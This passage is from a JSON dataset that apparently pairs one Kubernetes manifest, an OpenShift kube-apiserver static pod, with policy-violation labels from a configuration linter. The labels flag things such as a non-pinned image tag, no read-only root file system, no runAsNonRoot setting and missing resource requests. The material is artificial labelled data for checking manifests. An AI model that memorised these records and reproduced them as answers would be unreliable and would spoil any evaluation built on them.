    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: openshift-kube-apiserver\n  name: kube-apiserver\n  labels:\n    app: openshift-kube-apiserver\n    apiserver: 'true'\n    revision: REVISION\nspec:\n  initContainers:\n  - name: setup\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    command:\n    - /usr/bin/timeout\n    - '105'\n    - /bin/bash\n    - -ec\n    args:\n    - \"echo -n \\\"Fixing audit permissions.\\\"\\nchmod 0700 /var/log/kube-apiserver\\n\\\n      echo -n \\\"Waiting for port :6443 to be released.\\\"\\nwhile [ -n \\\"$(lsof -ni\\\n      \\ :6443)\\\" ]; do\\n  echo -n \\\".\\\"\\n  sleep 1\\ndone\\n\"\n  containers:\n  - name: kube-apiserver-REVISION\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - hypershift\n    - openshift-kube-apiserver\n    args:\n    - --config=/etc/kubernetes/static-pod-resources/configmaps/config/config.yaml\n    resources:\n      requests:\n        memory: 1Gi\n        cpu: 150m\n    ports:\n    - containerPort: 6443\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    livenessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 45\n      timeoutSeconds: 10\n    readinessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 10\n      timeoutSeconds: 10\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: STATIC_POD_VERSION\n      value: REVISION\n  - name: kube-apiserver-cert-syncer-REVISION\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    image: ${OPERATOR_IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - cluster-kube-apiserver-operator\n    - cert-syncer\n    args:\n    - --kubeconfig=/etc/kubernetes/static-pod-resources/configmaps/kube-apiserver-cert-syncer-kubeconfig/kubeconfig\n    - --namespace=$(POD_NAMESPACE)\n    - --destination-dir=/etc/kubernetes/static-pod-certs\n    resources:\n      requests:\n        memory: 50Mi\n        cpu: 10m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-pod-REVISION\n    name: resource-dir\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-certs\n    name: cert-dir\n  - hostPath:\n      path: /var/log/kube-apiserver\n    name: audit-dir\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"setup\" is using an invalid container image, \"${IMAGE}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11214",
    "manifest_path": "data/manifests/the_stack_sample/sample_4318.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: openshift-kube-apiserver\n  name: kube-apiserver\n  labels:\n    app: openshift-kube-apiserver\n    apiserver: 'true'\n    revision: REVISION\nspec:\n  initContainers:\n  - name: setup\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    command:\n    - /usr/bin/timeout\n    - '105'\n    - /bin/bash\n    - -ec\n    args:\n    - \"echo -n \\\"Fixing audit permissions.\\\"\\nchmod 0700 /var/log/kube-apiserver\\n\\\n      echo -n \\\"Waiting for port :6443 to be released.\\\"\\nwhile [ -n \\\"$(lsof -ni\\\n      \\ :6443)\\\" ]; do\\n  echo -n \\\".\\\"\\n  sleep 1\\ndone\\n\"\n  containers:\n  - name: kube-apiserver-REVISION\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - hypershift\n    - openshift-kube-apiserver\n    args:\n    - --config=/etc/kubernetes/static-pod-resources/configmaps/config/config.yaml\n    resources:\n      requests:\n        memory: 1Gi\n        cpu: 150m\n    ports:\n    - containerPort: 6443\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    livenessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 45\n      timeoutSeconds: 10\n    readinessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 10\n      timeoutSeconds: 10\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: STATIC_POD_VERSION\n      value: REVISION\n  - name: kube-apiserver-cert-syncer-REVISION\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    image: ${OPERATOR_IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - cluster-kube-apiserver-operator\n    - cert-syncer\n    args:\n    - --kubeconfig=/etc/kubernetes/static-pod-resources/configmaps/kube-apiserver-cert-syncer-kubeconfig/kubeconfig\n    - --namespace=$(POD_NAMESPACE)\n    - --destination-dir=/etc/kubernetes/static-pod-certs\n    resources:\n      requests:\n        memory: 50Mi\n        cpu: 10m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-pod-REVISION\n    name: resource-dir\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-certs\n    name: cert-dir\n  - hostPath:\n      path: /var/log/kube-apiserver\n    name: audit-dir\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-apiserver-REVISION\" does not have a read-only root file system"
  },
  {
    "id": "11215",
    "manifest_path": "data/manifests/the_stack_sample/sample_4318.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: openshift-kube-apiserver\n  name: kube-apiserver\n  labels:\n    app: openshift-kube-apiserver\n    apiserver: 'true'\n    revision: REVISION\nspec:\n  initContainers:\n  - name: setup\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    command:\n    - /usr/bin/timeout\n    - '105'\n    - /bin/bash\n    - -ec\n    args:\n    - \"echo -n \\\"Fixing audit permissions.\\\"\\nchmod 0700 /var/log/kube-apiserver\\n\\\n      echo -n \\\"Waiting for port :6443 to be released.\\\"\\nwhile [ -n \\\"$(lsof -ni\\\n      \\ :6443)\\\" ]; do\\n  echo -n \\\".\\\"\\n  sleep 1\\ndone\\n\"\n  containers:\n  - name: kube-apiserver-REVISION\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - hypershift\n    - openshift-kube-apiserver\n    args:\n    - --config=/etc/kubernetes/static-pod-resources/configmaps/config/config.yaml\n    resources:\n      requests:\n        memory: 1Gi\n        cpu: 150m\n    ports:\n    - containerPort: 6443\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    livenessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 45\n      timeoutSeconds: 10\n    readinessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 10\n      timeoutSeconds: 10\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: STATIC_POD_VERSION\n      value: REVISION\n  - name: kube-apiserver-cert-syncer-REVISION\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    image: ${OPERATOR_IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - cluster-kube-apiserver-operator\n    - cert-syncer\n    args:\n    - --kubeconfig=/etc/kubernetes/static-pod-resources/configmaps/kube-apiserver-cert-syncer-kubeconfig/kubeconfig\n    - --namespace=$(POD_NAMESPACE)\n    - --destination-dir=/etc/kubernetes/static-pod-certs\n    resources:\n      requests:\n        memory: 50Mi\n        cpu: 10m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-pod-REVISION\n    name: resource-dir\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-certs\n    name: cert-dir\n  - hostPath:\n      path: /var/log/kube-apiserver\n    name: audit-dir\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-apiserver-cert-syncer-REVISION\" does not have a read-only root file system"
  },
  {
    "id": "11216",
    "manifest_path": "data/manifests/the_stack_sample/sample_4318.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: openshift-kube-apiserver\n  name: kube-apiserver\n  labels:\n    app: openshift-kube-apiserver\n    apiserver: 'true'\n    revision: REVISION\nspec:\n  initContainers:\n  - name: setup\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    command:\n    - /usr/bin/timeout\n    - '105'\n    - /bin/bash\n    - -ec\n    args:\n    - \"echo -n \\\"Fixing audit permissions.\\\"\\nchmod 0700 /var/log/kube-apiserver\\n\\\n      echo -n \\\"Waiting for port :6443 to be released.\\\"\\nwhile [ -n \\\"$(lsof -ni\\\n      \\ :6443)\\\" ]; do\\n  echo -n \\\".\\\"\\n  sleep 1\\ndone\\n\"\n  containers:\n  - name: kube-apiserver-REVISION\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - hypershift\n    - openshift-kube-apiserver\n    args:\n    - --config=/etc/kubernetes/static-pod-resources/configmaps/config/config.yaml\n    resources:\n      requests:\n        memory: 1Gi\n        cpu: 150m\n    ports:\n    - containerPort: 6443\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    livenessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 45\n      timeoutSeconds: 10\n    readinessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 10\n      timeoutSeconds: 10\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: STATIC_POD_VERSION\n      value: REVISION\n  - name: kube-apiserver-cert-syncer-REVISION\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    image: ${OPERATOR_IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - cluster-kube-apiserver-operator\n    - cert-syncer\n    args:\n    - --kubeconfig=/etc/kubernetes/static-pod-resources/configmaps/kube-apiserver-cert-syncer-kubeconfig/kubeconfig\n    - --namespace=$(POD_NAMESPACE)\n    - --destination-dir=/etc/kubernetes/static-pod-certs\n    resources:\n      requests:\n        memory: 50Mi\n        cpu: 10m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-pod-REVISION\n    name: resource-dir\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-certs\n    name: cert-dir\n  - hostPath:\n      path: /var/log/kube-apiserver\n    name: audit-dir\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"setup\" does not have a read-only root file system"
  },
  {
    "id": "11217",
    "manifest_path": "data/manifests/the_stack_sample/sample_4318.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: openshift-kube-apiserver\n  name: kube-apiserver\n  labels:\n    app: openshift-kube-apiserver\n    apiserver: 'true'\n    revision: REVISION\nspec:\n  initContainers:\n  - name: setup\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    command:\n    - /usr/bin/timeout\n    - '105'\n    - /bin/bash\n    - -ec\n    args:\n    - \"echo -n \\\"Fixing audit permissions.\\\"\\nchmod 0700 /var/log/kube-apiserver\\n\\\n      echo -n \\\"Waiting for port :6443 to be released.\\\"\\nwhile [ -n \\\"$(lsof -ni\\\n      \\ :6443)\\\" ]; do\\n  echo -n \\\".\\\"\\n  sleep 1\\ndone\\n\"\n  containers:\n  - name: kube-apiserver-REVISION\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - hypershift\n    - openshift-kube-apiserver\n    args:\n    - --config=/etc/kubernetes/static-pod-resources/configmaps/config/config.yaml\n    resources:\n      requests:\n        memory: 1Gi\n        cpu: 150m\n    ports:\n    - containerPort: 6443\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    livenessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 45\n      timeoutSeconds: 10\n    readinessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 10\n      timeoutSeconds: 10\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: STATIC_POD_VERSION\n      value: REVISION\n  - name: kube-apiserver-cert-syncer-REVISION\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    image: ${OPERATOR_IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - cluster-kube-apiserver-operator\n    - cert-syncer\n    args:\n    - --kubeconfig=/etc/kubernetes/static-pod-resources/configmaps/kube-apiserver-cert-syncer-kubeconfig/kubeconfig\n    - --namespace=$(POD_NAMESPACE)\n    - --destination-dir=/etc/kubernetes/static-pod-certs\n    resources:\n      requests:\n        memory: 50Mi\n        cpu: 10m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-pod-REVISION\n    name: resource-dir\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-certs\n    name: cert-dir\n  - hostPath:\n      path: /var/log/kube-apiserver\n    name: audit-dir\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-apiserver-REVISION\" is not set to runAsNonRoot"
  },
  {
    "id": "11218",
    "manifest_path": "data/manifests/the_stack_sample/sample_4318.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: openshift-kube-apiserver\n  name: kube-apiserver\n  labels:\n    app: openshift-kube-apiserver\n    apiserver: 'true'\n    revision: REVISION\nspec:\n  initContainers:\n  - name: setup\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    command:\n    - /usr/bin/timeout\n    - '105'\n    - /bin/bash\n    - -ec\n    args:\n    - \"echo -n \\\"Fixing audit permissions.\\\"\\nchmod 0700 /var/log/kube-apiserver\\n\\\n      echo -n \\\"Waiting for port :6443 to be released.\\\"\\nwhile [ -n \\\"$(lsof -ni\\\n      \\ :6443)\\\" ]; do\\n  echo -n \\\".\\\"\\n  sleep 1\\ndone\\n\"\n  containers:\n  - name: kube-apiserver-REVISION\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - hypershift\n    - openshift-kube-apiserver\n    args:\n    - --config=/etc/kubernetes/static-pod-resources/configmaps/config/config.yaml\n    resources:\n      requests:\n        memory: 1Gi\n        cpu: 150m\n    ports:\n    - containerPort: 6443\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    livenessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 45\n      timeoutSeconds: 10\n    readinessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 10\n      timeoutSeconds: 10\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: STATIC_POD_VERSION\n      value: REVISION\n  - name: kube-apiserver-cert-syncer-REVISION\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    image: ${OPERATOR_IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - cluster-kube-apiserver-operator\n    - cert-syncer\n    args:\n    - --kubeconfig=/etc/kubernetes/static-pod-resources/configmaps/kube-apiserver-cert-syncer-kubeconfig/kubeconfig\n    - --namespace=$(POD_NAMESPACE)\n    - --destination-dir=/etc/kubernetes/static-pod-certs\n    resources:\n      requests:\n        memory: 50Mi\n        cpu: 10m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-pod-REVISION\n    name: resource-dir\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-certs\n    name: cert-dir\n  - hostPath:\n      path: /var/log/kube-apiserver\n    name: audit-dir\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-apiserver-cert-syncer-REVISION\" is not set to runAsNonRoot"
  },
  {
    "id": "11219",
    "manifest_path": "data/manifests/the_stack_sample/sample_4318.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: openshift-kube-apiserver\n  name: kube-apiserver\n  labels:\n    app: openshift-kube-apiserver\n    apiserver: 'true'\n    revision: REVISION\nspec:\n  initContainers:\n  - name: setup\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    command:\n    - /usr/bin/timeout\n    - '105'\n    - /bin/bash\n    - -ec\n    args:\n    - \"echo -n \\\"Fixing audit permissions.\\\"\\nchmod 0700 /var/log/kube-apiserver\\n\\\n      echo -n \\\"Waiting for port :6443 to be released.\\\"\\nwhile [ -n \\\"$(lsof -ni\\\n      \\ :6443)\\\" ]; do\\n  echo -n \\\".\\\"\\n  sleep 1\\ndone\\n\"\n  containers:\n  - name: kube-apiserver-REVISION\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - hypershift\n    - openshift-kube-apiserver\n    args:\n    - --config=/etc/kubernetes/static-pod-resources/configmaps/config/config.yaml\n    resources:\n      requests:\n        memory: 1Gi\n        cpu: 150m\n    ports:\n    - containerPort: 6443\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    livenessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 45\n      timeoutSeconds: 10\n    readinessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 10\n      timeoutSeconds: 10\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: STATIC_POD_VERSION\n      value: REVISION\n  - name: kube-apiserver-cert-syncer-REVISION\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    image: ${OPERATOR_IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - cluster-kube-apiserver-operator\n    - cert-syncer\n    args:\n    - --kubeconfig=/etc/kubernetes/static-pod-resources/configmaps/kube-apiserver-cert-syncer-kubeconfig/kubeconfig\n    - --namespace=$(POD_NAMESPACE)\n    - --destination-dir=/etc/kubernetes/static-pod-certs\n    resources:\n      requests:\n        memory: 50Mi\n        cpu: 10m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-pod-REVISION\n    name: resource-dir\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-certs\n    name: cert-dir\n  - hostPath:\n      path: /var/log/kube-apiserver\n    name: audit-dir\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"setup\" is not set to runAsNonRoot"
  },
  {
    "id": "11220",
    "manifest_path": "data/manifests/the_stack_sample/sample_4318.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: openshift-kube-apiserver\n  name: kube-apiserver\n  labels:\n    app: openshift-kube-apiserver\n    apiserver: 'true'\n    revision: REVISION\nspec:\n  initContainers:\n  - name: setup\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    command:\n    - /usr/bin/timeout\n    - '105'\n    - /bin/bash\n    - -ec\n    args:\n    - \"echo -n \\\"Fixing audit permissions.\\\"\\nchmod 0700 /var/log/kube-apiserver\\n\\\n      echo -n \\\"Waiting for port :6443 to be released.\\\"\\nwhile [ -n \\\"$(lsof -ni\\\n      \\ :6443)\\\" ]; do\\n  echo -n \\\".\\\"\\n  sleep 1\\ndone\\n\"\n  containers:\n  - name: kube-apiserver-REVISION\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - hypershift\n    - openshift-kube-apiserver\n    args:\n    - --config=/etc/kubernetes/static-pod-resources/configmaps/config/config.yaml\n    resources:\n      requests:\n        memory: 1Gi\n        cpu: 150m\n    ports:\n    - containerPort: 6443\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    livenessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 45\n      timeoutSeconds: 10\n    readinessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 10\n      timeoutSeconds: 10\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: STATIC_POD_VERSION\n      value: REVISION\n  - name: kube-apiserver-cert-syncer-REVISION\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    image: ${OPERATOR_IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - cluster-kube-apiserver-operator\n    - cert-syncer\n    args:\n    - --kubeconfig=/etc/kubernetes/static-pod-resources/configmaps/kube-apiserver-cert-syncer-kubeconfig/kubeconfig\n    - --namespace=$(POD_NAMESPACE)\n    - --destination-dir=/etc/kubernetes/static-pod-certs\n    resources:\n      requests:\n        memory: 50Mi\n        cpu: 10m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-pod-REVISION\n    name: resource-dir\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-certs\n    name: cert-dir\n  - hostPath:\n      path: /var/log/kube-apiserver\n    name: audit-dir\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"setup\" has cpu request 0"
  },
  {
    "id": "11221",
    "manifest_path": "data/manifests/the_stack_sample/sample_4318.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: openshift-kube-apiserver\n  name: kube-apiserver\n  labels:\n    app: openshift-kube-apiserver\n    apiserver: 'true'\n    revision: REVISION\nspec:\n  initContainers:\n  - name: setup\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    command:\n    - /usr/bin/timeout\n    - '105'\n    - /bin/bash\n    - -ec\n    args:\n    - \"echo -n \\\"Fixing audit permissions.\\\"\\nchmod 0700 /var/log/kube-apiserver\\n\\\n      echo -n \\\"Waiting for port :6443 to be released.\\\"\\nwhile [ -n \\\"$(lsof -ni\\\n      \\ :6443)\\\" ]; do\\n  echo -n \\\".\\\"\\n  sleep 1\\ndone\\n\"\n  containers:\n  - name: kube-apiserver-REVISION\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - hypershift\n    - openshift-kube-apiserver\n    args:\n    - --config=/etc/kubernetes/static-pod-resources/configmaps/config/config.yaml\n    resources:\n      requests:\n        memory: 1Gi\n        cpu: 150m\n    ports:\n    - containerPort: 6443\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    livenessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 45\n      timeoutSeconds: 10\n    readinessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 10\n      timeoutSeconds: 10\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: STATIC_POD_VERSION\n      value: REVISION\n  - name: kube-apiserver-cert-syncer-REVISION\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    image: ${OPERATOR_IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - cluster-kube-apiserver-operator\n    - cert-syncer\n    args:\n    - --kubeconfig=/etc/kubernetes/static-pod-resources/configmaps/kube-apiserver-cert-syncer-kubeconfig/kubeconfig\n    - --namespace=$(POD_NAMESPACE)\n    - --destination-dir=/etc/kubernetes/static-pod-certs\n    resources:\n      requests:\n        memory: 50Mi\n        cpu: 10m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-pod-REVISION\n    name: resource-dir\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-certs\n    name: cert-dir\n  - hostPath:\n      path: /var/log/kube-apiserver\n    name: audit-dir\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-apiserver-REVISION\" has memory limit 0"
  },
  {
    "id": "11222",
    "manifest_path": "data/manifests/the_stack_sample/sample_4318.yaml",
